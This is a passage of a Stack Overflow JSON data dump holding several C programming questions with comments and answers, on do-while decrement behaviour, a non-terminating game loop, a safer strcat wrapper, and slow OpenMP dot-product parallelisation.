loop?"}, {"owner": {"reputation": 20968, "user_id": 2564301, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a6b5734cdcb5ce19598ccf9a7d8cc1ff?s=128&d=identicon&r=PG&f=1", "display_name": "Jongware", "link": "https://stackoverflow.com/users/2564301/jongware"}, "reply_to_user": {"reputation": 6171, "user_id": 3885008, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/2w1Vd.png?s=128&g=1", "display_name": "gmiley", "link": "https://stackoverflow.com/users/3885008/gmiley"}, "edited": false, "score": 0, "creation_date": 1461795052, "post_id": 36901747, "comment_id": 61367728, "body": "@gmiley: so according to you, this <code>i = 5; do { printf (&quot;%d\\n&quot;, i); } while (i--);</code> will not work? (Beware: I tested it.)"}, {"owner": {"reputation": 2137, "user_id": 1212725, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/152c2f757fe98760a1cca54a21f63a31?s=128&d=identicon&r=PG", "display_name": "bruceg", "link": "https://stackoverflow.com/users/1212725/bruceg"}, "edited": false, "score": 0, "creation_date": 1461795095, "post_id": 36901747, "comment_id": 61367746, "body": "put a printf inside the first loop before the sleep.  I bet something gets printed out."}, {"owner": {"reputation": 20968, "user_id": 2564301, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a6b5734cdcb5ce19598ccf9a7d8cc1ff?s=128&d=identicon&r=PG&f=1", "display_name": "Jongware", "link": "https://stackoverflow.com/users/2564301/jongware"}, "edited": false, "score": 1, "creation_date": 1461795135, "post_id": 36901747, "comment_id": 61367768, "body": "Is the <code>Ready</code> variable a volatile one? If not, the compiler may be short-circuiting this."}, {"owner": {"reputation": 6171, "user_id": 3885008, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/2w1Vd.png?s=128&g=1", "display_name": "gmiley", "link": "https://stackoverflow.com/users/3885008/gmiley"}, "edited": false, "score": 1, "creation_date": 1461795377, "post_id": 36901747, "comment_id": 61367873, "body": "Nevermind, that is correct, any non-zero is true, zero is false. I just always explicitly type out my comparisons. The only alternative is that <code>Ready</code> is set to <code>true</code> still. Try printing out the current value of <code>Ready</code> in your loop."}, {"owner": {"reputation": 2137, "user_id": 1212725, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/152c2f757fe98760a1cca54a21f63a31?s=128&d=identicon&r=PG", "display_name": "bruceg", "link": "https://stackoverflow.com/users/1212725/bruceg"}, "edited": false, "score": 0, "creation_date": 1461795782, "post_id": 36901747, "comment_id": 61368040, "body": "Also, you might want to tag the question with [iar] in case that&#39;s something weird with their compiler."}, {"owner": {"reputation": 2445, "user_id": 3476780, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/abf771bddcd864626a0e1499ccfc699b?s=128&d=identicon&r=PG&f=1", "display_name": "yano", "link": "https://stackoverflow.com/users/3476780/yano"}, "reply_to_user": {"reputation": 20968, "user_id": 2564301, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a6b5734cdcb5ce19598ccf9a7d8cc1ff?s=128&d=identicon&r=PG&f=1", "display_name": "Jongware", "link": "https://stackoverflow.com/users/2564301/jongware"}, "edited": false, "score": 1, "creation_date": 1461796997, "post_id": 36901747, "comment_id": 61368517, "body": "I suspect the real problem here has nothing to do with <code>i</code> and everything to do with <code>Ready</code>. Completely agree with what @RadLexus said. It could also be some kind of race condition between the thread setting <code>Ready</code> and the one here reading it... not enough code to tell."}, {"owner": {"reputation": 57, "user_id": 3096282, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5f4a8f748b19f2b074bf569ef8e71d04?s=128&d=identicon&r=PG&f=1", "display_name": "John.Majzner", "link": "https://stackoverflow.com/users/3096282/john-majzner"}, "edited": false, "score": 0, "creation_date": 1461797136, "post_id": 36901747, "comment_id": 61368577, "body": "I think it is going into the loop once but it looks like the i-- is being set to false when i = 5.  I agree  &quot;i-- &gt; 0&quot; is the correct way to write this on the first function, but was not sure if it was implied or up to the compiler on how it reads that."}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1461797270, "post_id": 36901747, "comment_id": 61368620, "body": "You could always just <code>while (i--) if (!READY) Task_sleep (1000);</code>"}, {"owner": {"reputation": 2445, "user_id": 3476780, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/abf771bddcd864626a0e1499ccfc699b?s=128&d=identicon&r=PG&f=1", "display_name": "yano", "link": "https://stackoverflow.com/users/3476780/yano"}, "edited": false, "score": 0, "creation_date": 1461797298, "post_id": 36901747, "comment_id": 61368628, "body": "I would remove <code>Ready</code> from the <code>while</code> condition entirely, then you can play with <code>i</code> as much as you want. Try <code>i--</code>, <code>--i</code> in the conditions, decrement <code>i</code> in the loop, whatever. That should tell you if it is in fact a problem with <code>i</code> or if <code>Ready</code> is throwing you a wrench"}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1461797906, "post_id": 36901747, "comment_id": 61368824, "body": "@John.Majzner -- do <i>NOT</i> delete parts of your questions. It is fine to <i>ADD</i> to your question as much as you want, but don&#39;t delete. That makes all previous answers appear out of context and it not helpful to others."}, {"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 0, "creation_date": 1461802174, "post_id": 36901747, "comment_id": 61370005, "body": "Show the assembly corresponding to each case"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1461865383, "post_id": 36901747, "comment_id": 61405281, "body": "does the code (properly) initialize the <code>Ready</code> variable to 0/false before entering the posted loop?"}, {"owner": {"reputation": 22994, "user_id": 623133, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/70bec1d6af7612c25f9ba0e1aa225dca?s=128&d=identicon&r=PG", "display_name": "Lindydancer", "link": "https://stackoverflow.com/users/623133/lindydancer"}, "edited": false, "score": 0, "creation_date": 1464968281, "post_id": 36901747, "comment_id": 62719441, "body": "Which CPU are you using? For, MSP430 and AVR, the IAR tools provide an intrinsic, <code>__delay_cycles()</code> that insert code that waits a specified number of cycles. This code will not be touched by the compiler."}], "answers": [{"comments": [{"owner": {"reputation": 2445, "user_id": 3476780, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/abf771bddcd864626a0e1499ccfc699b?s=128&d=identicon&r=PG&f=1", "display_name": "yano", "link": "https://stackoverflow.com/users/3476780/yano"}, "edited": false, "score": 0, "creation_date": 1461795848, "post_id": 36901895, "comment_id": 61368067, "body": "I don&#39;t know what OP means by &quot;The first will skip over the while loop&quot;,, but if <code>i</code> starts out at 5 he should get some looping regardless of post/pre-decrement operator used. Of course the loop is also dependent on <code>Ready</code>..."}, {"owner": {"reputation": 57, "user_id": 3096282, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5f4a8f748b19f2b074bf569ef8e71d04?s=128&d=identicon&r=PG&f=1", "display_name": "John.Majzner", "link": "https://stackoverflow.com/users/3096282/john-majzner"}, "edited": false, "score": 0, "creation_date": 1461796877, "post_id": 36901895, "comment_id": 61368463, "body": "The &quot;Ready&quot; is set to true after ~3s.  On the first loop it looks like it waits for 1s then keeps going.  On the second loop it waits the 3s and then moves on.  &quot;Ready&quot; is set to false  in the first function causing it to fail later in the thread."}], "tags": [], "owner": {"reputation": 16851, "user_id": 5460719, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e0f2a855c86ad12fc2988d3948b69ec6?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Karzes", "link": "https://stackoverflow.com/users/5460719/tom-karzes"}, "is_accepted": false, "score": 1, "last_activity_date": 1461795315, "creation_date": 1461795315, "answer_id": 36901895, "question_id": 36901747, "link": "https://stackoverflow.com/questions/36901747/a-operator-in-while-loop-function/36901895#36901895", "title": "A &quot;--&quot; operator in while loop function", "body": "<p>You're confusing post-decrement with pre-decrement operators.  The two operators are different.  Both <code>i--</code> and <code>--i</code> will decrement <code>i</code>.  But their values are different.  The value of <code>i--</code>, the post-decrement operator, is the <em>old</em> value of <code>i</code>.  The value of <code>--i</code>, the pre-decrement operator, is the <em>new</em> value of <code>i</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 1, "user_id": 6263824, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fc38e7de9bc6843d80aa55a215e0d180?s=128&d=identicon&r=PG&f=1", "display_name": "Xinyu Pan", "link": "https://stackoverflow.com/users/6263824/xinyu-pan"}, "is_accepted": false, "score": 0, "last_activity_date": 1461798937, "last_edit_date": 1461798937, "creation_date": 1461797885, "answer_id": 36902381, "question_id": 36901747, "link": "https://stackoverflow.com/questions/36901747/a-operator-in-while-loop-function/36902381#36902381", "title": "A &quot;--&quot; operator in while loop function", "body": "<p>Maybe you can try using <code>volatile</code> keyword to qualify variable <code>i</code> in the first version. I met a similar problem last week.</p>\n"}, {"tags": [], "owner": {"reputation": 4565, "user_id": 1134885, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7c428466054762cf7d4b5fb5f4396fa2?s=128&d=identicon&r=PG", "display_name": "NovaDenizen", "link": "https://stackoverflow.com/users/1134885/novadenizen"}, "is_accepted": false, "score": 1, "last_activity_date": 1461802160, "creation_date": 1461802160, "answer_id": 36903045, "question_id": 36901747, "link": "https://stackoverflow.com/questions/36901747/a-operator-in-while-loop-function/36903045#36903045", "title": "A &quot;--&quot; operator in while loop function", "body": "<p>Your first code:</p>\n\n<pre><code>do {\n    Task_sleep(1000);\n}while(i-- &amp;&amp; !Ready);\n</code></pre>\n\n<p>Is equivalent to this:</p>\n\n<pre><code>int condition;\nTOP:\nTask_sleep(1000);\ncondition = (i != 0 &amp;&amp; !Ready);\ni = i - 1;\nif (condition)\n    goto TOP\n</code></pre>\n\n<p>Your second code:</p>\n\n<pre><code>do {\n\n    Task_sleep(1000);\n    i--;\n}while(i &gt; 0 &amp;&amp; !Ready);\n</code></pre>\n\n<p>is equivalent to this:</p>\n\n<pre><code>int condition;\nTOP:\nTask_sleep(1000);\ni = i - 1;\ncondition = (i &gt; 0 &amp;&amp; !Ready);\nif (condition) goto TOP;\n</code></pre>\n\n<p>The loops are different.    <code>i</code> is decremented at a different time relative to the time the condition is evaluated, and the comparison on <code>i</code> within the condition is different.</p>\n"}], "owner": {"reputation": 57, "user_id": 3096282, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5f4a8f748b19f2b074bf569ef8e71d04?s=128&d=identicon&r=PG&f=1", "display_name": "John.Majzner", "link": "https://stackoverflow.com/users/3096282/john-majzner"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 115, "favorite_count": 0, "answer_count": 3, "score": 2, "last_activity_date": 1461802160, "creation_date": 1461794644, "last_edit_date": 1461799886, "question_id": 36901747, "link": "https://stackoverflow.com/questions/36901747/a-operator-in-while-loop-function", "title": "A &quot;--&quot; operator in while loop function", "body": "<p>I am coding in C on a IAR compiler and have two while loops:</p>\n\n<pre><code>i= 5;\ndo {\n    Task_sleep(1000);\n}while(i-- &amp;&amp; !Ready);\n\nif (!Ready)\n   {\n      dprint(\"No ready response!\");\n      return false;\n   }\n</code></pre>\n\n<p>And</p>\n\n<pre><code>i= 5;\ndo {\n\n    Task_sleep(1000);\n    i--;\n}while(i &gt; 0 &amp;&amp; !Ready);\n\nif (!Ready)\n       {\n          dprint(\"No ready response!\");\n          return false;\n       }\n</code></pre>\n\n<p>The first will skip over the while loop and the second works properly.  The \"Ready\" bool is set in another thread.  The first loop will return false and the second will pass so Ready is not getting set to true.</p>\n\n<p>I am thinking the compiler does not know how to handle the i-- in the while and is setting it to false.  Is there something else that could be going on?  With my setup I cannot step through the code in debug.</p>\n\n<p>Edit Added to functions:</p>\n\n<pre><code>if(!Ready)\n{\n dprint(\"No Ready responce!\");\nreturn false;\n}\n</code></pre>\n\n<p>Tested Ready as volatile, --i instead of i--, and removing Ready.  All failed.  Testing:</p>\n\n<pre><code>}while(((i--) &gt; 0) &amp;&amp; !Ready);\n</code></pre>\n\n<p>Still fails, it has to be the IAR compiler not reading the i-- properly and needs to have the -- operation removed from the while function.  Let me know if you guys have anything else I can try but I feel confident in closing this issue.</p>\n"}, {"tags": ["c", "loops"], "comments": [{"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 2, "creation_date": 1461794445, "post_id": 36901643, "comment_id": 61367472, "body": "maybe you wanted <code>while(dinP != 2 &amp;&amp; pcP != 2)</code>?"}, {"owner": {"reputation": 507, "user_id": 4993180, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/EAtti.jpg?s=128&g=1", "display_name": "Striker", "link": "https://stackoverflow.com/users/4993180/striker"}, "edited": false, "score": 0, "creation_date": 1461794869, "post_id": 36901643, "comment_id": 61367667, "body": "while (dinP != 2 || pcP != 2) is always true until both dinP and pcP is 2. Try while (dinP &lt; 2 &amp;&amp; pcP &lt; 2)"}], "answers": [{"tags": [], "owner": {"reputation": 4230, "user_id": 945873, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/d561be4c73996732e6639b5421abfb97?s=128&d=identicon&r=PG&f=1", "display_name": "itdoesntwork", "link": "https://stackoverflow.com/users/945873/itdoesntwork"}, "is_accepted": true, "score": 4, "last_activity_date": 1461794449, "creation_date": 1461794449, "answer_id": 36901702, "question_id": 36901643, "link": "https://stackoverflow.com/questions/36901643/c-program-not-exiting/36901702#36901702", "title": "C Program not exiting?", "body": "<p>Think about this part:</p>\n\n<pre><code>while(dinP != 2 || pcP != 2)\n</code></pre>\n\n<p>The expression will be false when they're BOTH equal to 2. It's going to keep running until the player and the computer both have 2 points. To fix this, just change the <code>||</code> to <code>&amp;&amp;</code>.</p>\n"}], "owner": {"reputation": 15, "user_id": 6263794, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6b63932cfca998d84f025c15625e9b30?s=128&d=identicon&r=PG&f=1", "display_name": "Mos Om", "link": "https://stackoverflow.com/users/6263794/mos-om"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 51, "favorite_count": 0, "accepted_answer_id": 36901702, "answer_count": 1, "score": 0, "last_activity_date": 1461794449, "creation_date": 1461794213, "question_id": 36901643, "link": "https://stackoverflow.com/questions/36901643/c-program-not-exiting", "title": "C Program not exiting?", "body": "<p>I have an assignment where I have to write a program for paper-scissor-rock.</p>\n\n<p>You play against \"PC\", and the first to score 2 points win. After scoring 2 points, the program should stop and print out the winner.</p>\n\n<p>Here is my code:</p>\n\n<pre><code>int main()\n{\nsrand(time(NULL));\nint dinP = 0;\nint pcP = 0;\n\nprintf(\"Welcome to rock paper scissor!\\n\");\n\nwhile(dinP != 2 || pcP != 2){\n\nint player, computer, letsgo;\n\nprintf(\"Press any key to continue.\\n\");\nscanf(\"%d\", &amp;letsgo);\n\nprintf(\"Your turn!\\n 0 for Paper\\n 1 for Rock\\n 2 for Scissor\\n\");\nscanf(\"%d\", &amp;player);\n\ncomputer = rand() % 3;\nprintf(\"computers picked\",computer);\n\nif (player == 0 &amp;&amp; computer == 0 || player == 1 &amp;&amp; computer == 1 || player == 2 &amp;&amp; computer == 2)\n\n{\n\n//    printf(\"Player picked %d\\n\", player);\n//    printf(\"Computer picked %d\\n\", computer);\n    printf(\"Therefore the result is 0 you ended up equal!\\n\");\n\n}\n\nif (player == 0 &amp;&amp; computer == 1 || player == 1 &amp;&amp;computer == 2 || player == 2 &amp;&amp; computer == 0)\n\n{\n\n //   printf(\"player picked %d\\n\", player);\n //   printf(\"Computer picked %d\\n\", computer);\n    printf(\"Player wins!\\n 1 point for Player\\n\");\n    dinP++;\n\n}\n\n\nif(player == 0 &amp;&amp; computer == 2 || player == 1 &amp;&amp; computer == 0 || player == 2 &amp;&amp; computer == 1)\n\n{\n\n  //  printf(\"player picked %d\\n\", player);\n //   printf(\"Computer picked %d\\n\", computer);\n    printf(\"Computer wins!\\n Computer Wins! 1 point for the Computer\\n\");\n    pcP++;\n\n}\n\nif(player &lt; 0 || player &gt;= 3)\n\n{\n    printf(\"Please enter a valid number\\n In other words, pick either rock, paper or scissor.\\n\");\n}\n\nprintf(\"dinP  : %d - - - - - pcP : %d\", dinP, pcP);\n\n}\n\nif(dinP == 2){\n    printf(\"You won\\n\");\n  //  printf(\"p: %d\", dinP);\n}else if(pcP == 2){\n    printf(\"Pc Won\\n\");\n  //  printf(\"p: %d\", pcP);\n}\n\nreturn 0;\n</code></pre>\n\n<p>}</p>\n\n<p>After scoring 2 points, the program doesnt stop and keeps asking for my input. Any suggestions why it doesnt end after 2 points?</p>\n"}, {"tags": ["c", "c-strings"], "comments": [{"owner": {"reputation": 4230, "user_id": 945873, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/d561be4c73996732e6639b5421abfb97?s=128&d=identicon&r=PG&f=1", "display_name": "itdoesntwork", "link": "https://stackoverflow.com/users/945873/itdoesntwork"}, "edited": false, "score": 0, "creation_date": 1461794134, "post_id": 36901577, "comment_id": 61367320, "body": "why are you including string.h but then re-defining some of its functions? I&#39;m surprised this even compiles."}, {"owner": {"reputation": 18146, "user_id": 646619, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/bd61a0f309ebc135d2661710c2faf379?s=128&d=identicon&r=PG", "display_name": "Colonel Thirty Two", "link": "https://stackoverflow.com/users/646619/colonel-thirty-two"}, "edited": false, "score": 0, "creation_date": 1461794134, "post_id": 36901577, "comment_id": 61367321, "body": "C functions are not overloaded; function return values and parameters do not affect the symbol. Also note that you cannot possibly have a conforming <code>strcat</code> with your example; <code>strcat</code> by definition modifies the buffer pointed to by <code>dest</code>, but doing so in your case would modify past the end of the buffer."}, {"owner": {"reputation": 18146, "user_id": 646619, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/bd61a0f309ebc135d2661710c2faf379?s=128&d=identicon&r=PG", "display_name": "Colonel Thirty Two", "link": "https://stackoverflow.com/users/646619/colonel-thirty-two"}, "edited": false, "score": 1, "creation_date": 1461794210, "post_id": 36901577, "comment_id": 61367363, "body": "Also IIRC compilers are allowed to assuming standard C functions perform as they are specified in the C spec and optimize them out. If that&#39;s the case, the compiler might be optimizing <code>strcat(dest, &quot;Hello World&quot;)</code> to a simple <code>strlen</code> and <code>memcpy</code>."}, {"owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 0, "creation_date": 1461794478, "post_id": 36901577, "comment_id": 61367497, "body": "Try compiling with -fno-builtin to disable usage of builtin strcat and friends"}, {"owner": {"reputation": 273, "user_id": 1146200, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/bf49f208d9f3b42c7c5d039e6400b255?s=128&d=identicon&r=PG", "display_name": "Shashank Singh", "link": "https://stackoverflow.com/users/1146200/shashank-singh"}, "reply_to_user": {"reputation": 18146, "user_id": 646619, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/bd61a0f309ebc135d2661710c2faf379?s=128&d=identicon&r=PG", "display_name": "Colonel Thirty Two", "link": "https://stackoverflow.com/users/646619/colonel-thirty-two"}, "edited": false, "score": 0, "creation_date": 1461794624, "post_id": 36901577, "comment_id": 61367565, "body": "@ColonelThirtyTwo Thanks. That makes sense and could be the case. I am actually calling the libc strcat internally with dlsym, I only check if I can convert it to a safer strncat by remembering all mallocs with their sizes. I have written a small linkedlist to store them and malloc and free wrappers respectively that work fine. I couldn&#39;t understand how am I not conforming to strcat though?"}, {"owner": {"reputation": 18146, "user_id": 646619, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/bd61a0f309ebc135d2661710c2faf379?s=128&d=identicon&r=PG", "display_name": "Colonel Thirty Two", "link": "https://stackoverflow.com/users/646619/colonel-thirty-two"}, "edited": false, "score": 0, "creation_date": 1461794882, "post_id": 36901577, "comment_id": 61367672, "body": "Nevermind about that; I was misreading your example. However, if you&#39;re concerned with buffer overflows AddressSanitizer can catch <code>strcat</code> misuses and a lot more; add <code>-fsanitize=address</code> to your compile flags."}, {"owner": {"reputation": 525, "user_id": 2747961, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/2f020f3f1b168067b0b1c06fb1094081?s=128&d=identicon&r=PG&f=1", "display_name": "ddz", "link": "https://stackoverflow.com/users/2747961/ddz"}, "edited": false, "score": 0, "creation_date": 1461794905, "post_id": 36901577, "comment_id": 61367682, "body": "Be careful when defining <code>_GNU_SOURCE</code>. Look at <a href=\"http://stackoverflow.com/questions/5582211/what-does-define-gnu-source-imply/5583764#5583764\">this question</a> for more info."}], "owner": {"reputation": 273, "user_id": 1146200, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/bf49f208d9f3b42c7c5d039e6400b255?s=128&d=identicon&r=PG", "display_name": "Shashank Singh", "link": "https://stackoverflow.com/users/1146200/shashank-singh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 445, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1461793878, "creation_date": 1461793878, "question_id": 36901577, "link": "https://stackoverflow.com/questions/36901577/strcat-conversion-from-char-to-const-char", "title": "strcat conversion from char* to const char*", "body": "<p>I a writing a custom wrapper that implements strcat, strcpy etc in a safer way by trying to remember heap size allocations to adresses. For example, if a malloc(100) returned a pointer p, strcat checks current size of string at p and converts safely to strncat if it remembers the p from malloc. Here is my implementation:</p>\n\n<pre><code>#define _GNU_SOURCE\n#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;dlfcn.h&gt;\n#include &lt;string.h&gt;\n#include \"linkedlist.h\"\n\nList * ptrSizes;\n\nchar *(*libc_strcat)(char * , const char * );\n\nchar* strcat(char * dest, const char * src){\n    printf(\"Called strcat\\n\");\n    if (ptrSizes == NULL) {\n        ptrSizes = createList();\n    }\n    if (libc_strcat == NULL) {\n        libc_strcat = dlsym(RTLD_NEXT, \"strcat\");\n    }\n    // Assume node returns the saved mapping correctly      \n    Node* node = findInList(ptrSizes, dest);\n    if (node != NULL){\n        size_t curr_sz = strlen(dest);\n        size_t left = node -&gt; max_sz - curr_sz - 1;\n        if (left &gt; 0) {\n            printf(\"Copying %zd bytes with strncat\\n\", left);\n            dest = strncat(dest, src, left);\n        }\n        else{\n            printf(\"No copy to prevent overflow\\n\");\n        }\n    }\n    else{\n        // no memory of malloc. Can't help yet\n        dest = libc_strcat(dest, src);\n    }\n    return dest;\n}\n</code></pre>\n\n<p>Now my problem is that in any test file, <code>strcat(dest, \"Hello World\");</code> does not call my wrapper strcat, but </p>\n\n<pre><code>char src[]=\"Hello World\";\nstrcat(dest, src);\n</code></pre>\n\n<p>properly calls my wrapper. I can't remove the const keyword as that makes it non-conformant with the declaration in string.h.</p>\n\n<p>What could I do so that both calls go to my wrapper?</p>\n"}, {"tags": ["c", "multithreading", "openmp"], "comments": [{"owner": {"reputation": 18146, "user_id": 646619, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/bd61a0f309ebc135d2661710c2faf379?s=128&d=identicon&r=PG", "display_name": "Colonel Thirty Two", "link": "https://stackoverflow.com/users/646619/colonel-thirty-two"}, "edited": false, "score": 0, "creation_date": 1461794987, "post_id": 36901558, "comment_id": 61367706, "body": "C and C++ are different languages; remove the tag of the one you are not using."}, {"owner": {"reputation": 65854, "user_id": 1374437, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/34xta.png?s=128&g=1", "display_name": "Hristo &#39;away&#39; Iliev", "link": "https://stackoverflow.com/users/1374437/hristo-away-iliev"}, "edited": false, "score": 2, "creation_date": 1461826424, "post_id": 36901558, "comment_id": 61377757, "body": "Are you by any chance using <code>clock()</code> to measure the execution time on Linux?"}, {"owner": {"reputation": 20828, "user_id": 620382, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/bf285996e4e7188feac84786a47d9f3a?s=128&d=identicon&r=PG", "display_name": "Zulan", "link": "https://stackoverflow.com/users/620382/zulan"}, "edited": false, "score": 0, "creation_date": 1461829595, "post_id": 36901558, "comment_id": 61379710, "body": "Welcome to SO! Please provide more context with your question: How many threads, what hardware (CPU), how do you measure time, what vector sizes. Also please provide an <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>."}, {"owner": {"reputation": 29002, "user_id": 2542702, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/fW5ka.jpg?s=128&g=1", "display_name": "Z boson", "link": "https://stackoverflow.com/users/2542702/z-boson"}, "edited": false, "score": 1, "creation_date": 1461830024, "post_id": 36901558, "comment_id": 61379969, "body": "What compiler? What compiler options? Did you compile with optimization (e.g. <code>-O3</code> with GCC/Clang/ICC or <code>&#47;O2</code> with MSVC)? How did you time it? What is the size of <code>n</code>?.  85s is long long time so either you did not use optimization and/or <code>n</code> is very very large in which case the operations is memory bandwidth bound and the parallel version would not be much faster than the serial anyway."}], "answers": [{"comments": [{"owner": {"reputation": 65854, "user_id": 1374437, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/34xta.png?s=128&g=1", "display_name": "Hristo &#39;away&#39; Iliev", "link": "https://stackoverflow.com/users/1374437/hristo-away-iliev"}, "edited": false, "score": 1, "creation_date": 1461826367, "post_id": 36901804, "comment_id": 61377721, "body": "Nope, <code>prod</code> is a reduction variable."}], "tags": [], "owner": {"reputation": 669, "user_id": 6253379, "user_type": "registered", "accept_rate": 43, "profile_image": "https://i.stack.imgur.com/VDrH9.png?s=128&g=1", "display_name": "Nikos Kazazakis", "link": "https://stackoverflow.com/users/6253379/nikos-kazazakis"}, "is_accepted": false, "score": -2, "last_activity_date": 1461794913, "creation_date": 1461794913, "answer_id": 36901804, "question_id": 36901558, "link": "https://stackoverflow.com/questions/36901558/negative-speedup-when-parallelising-vector-vector-dot-product/36901804#36901804", "title": "Negative speedup When parallelising Vector Vector dot product", "body": "<p>Prod is private for every thread, but its value is dependent on the previous iteration. Try:</p>\n\n<p>prod[i]+=vec1[i]*vec2[i];</p>\n"}], "owner": {"reputation": 31, "user_id": 6263517, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7b15270e0e1346120cea833121260331?s=128&d=identicon&r=PG&f=1", "display_name": "a_myth", "link": "https://stackoverflow.com/users/6263517/a-myth"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 171, "favorite_count": 0, "answer_count": 1, "score": -2, "last_activity_date": 1461857662, "creation_date": 1461793801, "last_edit_date": 1461857662, "question_id": 36901558, "link": "https://stackoverflow.com/questions/36901558/negative-speedup-when-parallelising-vector-vector-dot-product", "title": "Negative speedup When parallelising Vector Vector dot product", "body": "<p>I have a subroutine which calculates vector dot product of large vectors. I have parallelised it using open MP. The following is my code: </p>\n\n<pre><code>double scalarProd(double* vec1, double* vec2, int n){\ndouble prod = 0.0;\nint chunk = 10; \nint i;\n//double* c = (double*) malloc(n*sizeof(double));\n\nomp_set_num_threads(4);\n\n#pragma omp parallel\n{\n    double pprod = 0.0;\n    #pragma omp for\n    for(i=0;i&lt;n;i++) {\n        pprod += vec1[i]*vec2[i];\n    }\n\n    #pragma omp critical\n    for(i=0;i&lt;n;i++) {\n        prod += pprod;\n    }\n}\n</code></pre>\n\n<p>return prod;\n}</p>\n\n<p>Can someone please tell me what is going wrong here? I am a newbie to multithreading</p>\n\n<p>Edit: </p>\n\n<p>Adding more information. Sorry, first timer here at SO.</p>\n\n<p>The above mentioned subroutine is called from my function ConjugateGradient() multiple  times. I have now added the time calculation code in my ConjugateGradient function as below:</p>\n\n<pre><code>start_dotprod = omp_get_wtime();\nrm_rm_old = scalarProd(rm,rm,MAT-&gt;ncols);\n    run_dotprod = omp_get_wtime() - start_dotprod;\nfprintf(timing,\"Time taken by rm_rm dot product : %lf \\n\",run_dotprod);\n</code></pre>\n\n<p>Observed results : Time taken for the dot product\nSequential Version : 0.000007s\nParallel Version   : 0.002110</p>\n\n<p>I am doing a simple compile using gcc -fopenmp command on Linux OS on my Intel I7 laptop.</p>\n\n<p>I am currently using a matrix of size n = 5000. </p>\n\n<p>I am getting huge speed down overall since the same dot product gets called multiple times till convergence is achieved( around 80k times).</p>\n\n<p>Please suggest me any improvements. I feel I am doing something terribly wrong.</p>\n\n<p>Thanks! :)</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 23331, "user_id": 134252, "user_type": "registered", "accept_rate": 66, "profile_image": 